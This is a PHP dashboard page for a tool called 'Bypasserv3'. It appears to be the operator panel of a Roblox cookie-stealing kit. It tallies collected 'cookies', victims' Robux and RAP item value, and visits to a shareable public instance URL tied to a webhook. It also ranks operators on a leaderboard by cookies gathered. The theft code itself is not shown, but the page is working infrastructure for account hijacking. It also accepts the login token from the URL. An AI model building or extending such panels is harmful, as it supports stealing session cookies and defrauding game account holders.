<?php
/**
 * Bypasserv3 - Dashboard
 */

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

// Start session
session_start();

// Check for token in URL or session
$token = $_GET['token'] ?? $_SESSION['token'] ?? null;

if (!$token) {
    header('Location: /dashboard/login.php');
    exit;
}

// Verify token
$tokenData = verifyToken($token);

if (!$tokenData) {
    session_destroy();
    header('Location: /dashboard/login.php?error=invalid_token');
    exit;
}

// Store in session
$_SESSION['token'] = $token;
$_SESSION['directory'] = $tokenData['directory'];
$_SESSION['webhook'] = $tokenData['webhook'];

// Get instance data
$directory = $tokenData['directory'];
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    die('Instance not found');
}

// Calculate stats changes
$stats = $instanceData['stats'];
$dailyStats = $instanceData['dailyStats'];

$today = date('w');
$yesterday = ($today - 1 + 7) % 7;

// Calculate percentage changes
function calculateChange($current, $previous) {
    if ($previous == 0) return $current > 0 ? 100 : 0;
    return round((($current - $previous) / $previous) * 100);
}

$cookiesChange = calculateChange($dailyStats['cookies'][$today], $dailyStats['cookies'][$yesterday]);
$visitsChange = calculateChange($dailyStats['visits'][$today], $dailyStats['visits'][$yesterday]);
$robuxChange = calculateChange($dailyStats['robux'][$today], $dailyStats['robux'][$yesterday]);
$rapChange = calculateChange($dailyStats['rap'][$today], $dailyStats['rap'][$yesterday]);
$summaryChange = calculateChange($dailyStats['summary'][$today], $dailyStats['summary'][$yesterday]);

// Get rank info
$rankInfo = getRankInfo($stats['totalCookies']);

// Get leaderboard
$leaderboard = getLeaderboard(5);

// Get instance URL
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$instanceUrl = $protocol . '://' . $domain . '/public/?dir=' . urlencode($directory);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Bypasserv3</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --dark: #02040a;
            --darker: #0a0e27;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 50%, var(--dark) 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }

        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }

        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            height: 100vh;
            width: 260px;
            overflow-y: auto;
        }

        .main-content {
            margin-left: 260px;
            padding: 20px;
        }

        .stat-card {
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3);
        }

        @media (max-width: 768px) {
            .sidebar {
                position: relative;
                width: 100%;
                height: auto;
            }
            .main-content {
                margin-left: 0;
            }
        }
    </style>
</head>
<body>
    <!-- Sidebar -->
    <div class="sidebar glass-effect p-6">
        <div class="mb-8">
            <div class="flex items-center gap-3 mb-6">
                <img src="<?php echo htmlspecialchars($instanceData['profilePicture']); ?>" alt="Profile" class="w-12 h-12 rounded-full border-2 border-purple-500">
                <div>
                    <div class="font-semibold"><?php echo htmlspecialchars($instanceData['username']); ?></div>
                    <div class="text-xs text-white/60"><?php echo $rankInfo['current']['icon']; ?> <?php echo $rankInfo['current']['name']; ?></div>
                </div>
            </div>
        </div>

        <nav class="space-y-2">
            <a href="#overview" class="flex items-center gap-3 px-4 py-3 rounded-lg bg-purple-600/20 text-white">
                <i class="fas fa-home w-5"></i>
                <span>Overview</span>
            </a>
            <a href="#settings" class="flex items-center gap-3 px-4 py-3 rounded-lg text-white/60 hover:bg-white/5 hover:text-white transition-all">
                <i class="fas fa-cog w-5"></i>
                <span>Settings</span>
            </a>
            <a href="logout.php" class="flex items-center gap-3 px-4 py-3 rounded-lg text-red-400/60 hover:bg-red-500/10 hover:text-red-400 transition-all">
                <i class="fas fa-sign-out-alt w-5"></i>
                <span>Logout</span>
            </a>
        </nav>

        <div class="mt-8 p-4 bg-white/5 rounded-lg">
            <div class="text-xs text-white/60 mb-2">Instance URL</div>
            <div class="text-xs font-mono text-white/80 break-all"><?php echo htmlspecialchars($instanceUrl); ?></div>
            <button onclick="copyInstanceUrl()" class="mt-3 w-full px-3 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg text-sm font-medium transition-all">
                <i class="fas fa-copy mr-2"></i>Copy URL
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <!-- Header -->
        <div class="mb-8">
            <h1 class="text-4xl font-bold mb-2">Dashboard</h1>
            <p class="text-white/60">Welcome back, <?php echo htmlspecialchars($instanceData['username']); ?>!</p>
        </div>

        <!-- Stats Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
            <!-- Cookies -->
            <div class="stat-card glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <div class="text-white/60 text-sm">Total Cookies</div>
                    <div class="text-xs <?php echo $cookiesChange >= 0 ? 'text-green-400' : 'text-red-400'; ?>">
                        <i class="fas fa-arrow-<?php echo $cookiesChange >= 0 ? 'up' : 'down'; ?>"></i>
                        <?php echo abs($cookiesChange); ?>%
                    </div>
                </div>
                <div class="text-3xl font-bold mb-2"><?php echo number_format($stats['totalCookies']); ?></div>
                <div class="h-16">
                    <canvas id="cookiesChart"></canvas>
                </div>
                <div class="text-xs text-white/40 mt-3">
                    +<?php echo $dailyStats['cookies'][$today]; ?> today
                </div>
            </div>

            <!-- Visits -->
            <div class="stat-card glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <div class="text-white/60 text-sm">Total Visits</div>
                    <div class="text-xs <?php echo $visitsChange >= 0 ? 'text-green-400' : 'text-red-400'; ?>">
                        <i class="fas fa-arrow-<?php echo $visitsChange >= 0 ? 'up' : 'down'; ?>"></i>
                        <?php echo abs($visitsChange); ?>%
                    </div>
                </div>
                <div class="text-3xl font-bold mb-2"><?php echo number_format($stats['totalVisits']); ?></div>
                <div class="h-16">
                    <canvas id="visitsChart"></canvas>
                </div>
                <div class="text-xs text-white/40 mt-3">
                    +<?php echo $dailyStats['visits'][$today]; ?> today
                </div>
            </div>

            <!-- Robux -->
            <div class="stat-card glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <div class="text-white/60 text-sm">Total Robux</div>
                    <div class="text-xs <?php echo $robuxChange >= 0 ? 'text-green-400' : 'text-red-400'; ?>">
                        <i class="fas fa-arrow-<?php echo $robuxChange >= 0 ? 'up' : 'down'; ?>"></i>
                        <?php echo abs($robuxChange); ?>%
                    </div>
                </div>
                <div class="text-3xl font-bold mb-2"><?php echo number_format($stats['totalRobux']); ?></div>
                <div class="h-16">
                    <canvas id="robuxChart"></canvas>
                </div>
                <div class="text-xs text-white/40 mt-3">
                    +<?php echo number_format($dailyStats['robux'][$today]); ?> today
                </div>
            </div>

            <!-- RAP -->
            <div class="stat-card glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <div class="text-white/60 text-sm">Total RAP</div>
                    <div class="text-xs <?php echo $rapChange >= 0 ? 'text-green-400' : 'text-red-400'; ?>">
                        <i class="fas fa-arrow-<?php echo $rapChange >= 0 ? 'up' : 'down'; ?>"></i>
                        <?php echo abs($rapChange); ?>%
                    </div>
                </div>
                <div class="text-3xl font-bold mb-2"><?php echo number_format($stats['totalRAP']); ?></div>
                <div class="h-16">
                    <canvas id="rapChart"></canvas>
                </div>
                <div class="text-xs text-white/40 mt-3">
                    +<?php echo number_format($dailyStats['rap'][$today]); ?> today
                </div>
            </div>

            <!-- Summary -->
            <div class="stat-card glass-effect rounded-2xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <div class="text-white/60 text-sm">Summary</div>
                    <div class="text-xs <?php echo $summaryChange >= 0 ? 'text-green-400' : 'text-red-400'; ?>">
                        <i class="fas fa-arrow-<?php echo $summaryChange >= 0 ? 'up' : 'down'; ?>"></i>
                        <?php echo abs($summaryChange); ?>%
                    </div>
                </div>
                <div class="text-3xl font-bold mb-2"><?php echo number_format($stats['totalSummary']); ?></div>
                <div class="h-16">
                    <canvas id="summaryChart"></canvas>
                </div>
                <div class="text-xs text-white/40 mt-3">
                    +<?php echo number_format($dailyStats['summary'][$today]); ?> today
                </div>
            </div>
        </div>

        <!-- Rank Progress -->
        <div class="glass-effect rounded-2xl p-6 mb-8">
            <h2 class="text-2xl font-bold mb-6">Rank Progress</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                    <div class="space-y-4">
                        <div class="flex items-center justify-between">
                            <span class="text-white/60">Current Rank</span>
                            <span class="font-semibold"><?php echo $rankInfo['current']['icon']; ?> <?php echo $rankInfo['current']['name']; ?></span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="text-white/60">Next Rank</span>
                            <span class="font-semibold"><?php echo $rankInfo['next']['icon']; ?> <?php echo $rankInfo['next']['name']; ?></span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="text-white/60">Cookies to Next</span>
                            <span class="font-semibold"><?php echo number_format($rankInfo['cookiesToNext']); ?></span>
                        </div>
                    </div>
                </div>
                <div>
                    <div class="mb-2 flex items-center justify-between">
                        <span class="text-sm text-white/60">Progress</span>
                        <span class="text-sm font-semibold"><?php echo $rankInfo['progress']; ?>%</span>
                    </div>
                    <div class="h-4 bg-white/10 rounded-full overflow-hidden">
                        <div class="h-full bg-gradient-to-r from-purple-500 to-pink-500 transition-all duration-500" style="width: <?php echo $rankInfo['progress']; ?>%"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Leaderboard -->
        <div class="glass-effect rounded-2xl p-6 mb-8">
            <h2 class="text-2xl font-bold mb-6">🏆 Leaderboard</h2>
            <div class="space-y-3">
                <?php foreach ($leaderboard as $index => $user): ?>
                    <?php 
                    $isCurrentUser = $user['directory'] === $directory;
                    $userRank = getRankInfo($user['totalCookies']);
                    ?>
                    <div class="flex items-center gap-4 p-4 bg-white/5 rounded-xl <?php echo $isCurrentUser ? 'ring-2 ring-purple-500' : ''; ?>">
                        <div class="text-2xl font-bold text-white/40 w-8">#<?php echo $index + 1; ?></div>
                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-purple-500/50">
                        <div class="flex-1">
                            <div class="font-semibold"><?php echo htmlspecialchars($user['username']); ?> <?php echo $isCurrentUser ? '(You)' : ''; ?></div>
                            <div class="text-sm text-white/60"><?php echo $userRank['current']['icon']; ?> <?php echo $userRank['current']['name']; ?></div>
                        </div>
                        <div class="text-right">
                            <div class="font-bold text-purple-400"><?php echo number_format($user['totalCookies']); ?></div>
                            <div class="text-xs text-white/60"><?php echo number_format($user['totalVisits']); ?> visits</div>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        const instanceUrl = <?php echo json_encode($instanceUrl); ?>;

        function copyInstanceUrl() {
            navigator.clipboard.writeText(instanceUrl).then(() => {
                Swal.fire({
                    icon: 'success',
                    title: 'Copied!',
                    text: 'Instance URL copied to clipboard',
                    toast: true,
                    position: 'top-end',
                    showConfirmButton: false,
                    timer: 3000,
                    timerProgressBar: true
                });
            });
        }

        // Chart configurations
        const chartOptions = {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: { display: false },
                tooltip: { enabled: false }
            },
            scales: {
                x: { display: false },
                y: { display: false }
            }
        };

        // Cookies Chart
        new Chart(document.getElementById('cookiesChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['cookies']); ?>,
                    borderColor: '#8b5cf6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Visits Chart
        new Chart(document.getElementById('visitsChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['visits']); ?>,
                    borderColor: '#ec4899',
                    backgroundColor: 'rgba(236, 72, 153, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Robux Chart
        new Chart(document.getElementById('robuxChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['robux']); ?>,
                    borderColor: '#10b981',
                    backgroundColor: 'rgba(16, 185, 129, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: chartOptions
        });

        // RAP Chart
        new Chart(document.getElementById('rapChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['rap']); ?>,
                    borderColor: '#3b82f6',
                    backgroundColor: 'rgba(59, 130, 246, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Summary Chart
        new Chart(document.getElementById('summaryChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['summary']); ?>,
                    borderColor: '#f59e0b',
                    backgroundColor: 'rgba(245, 158, 11, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }]
            },
            options: chartOptions
        });
    </script>
</body>
</html>
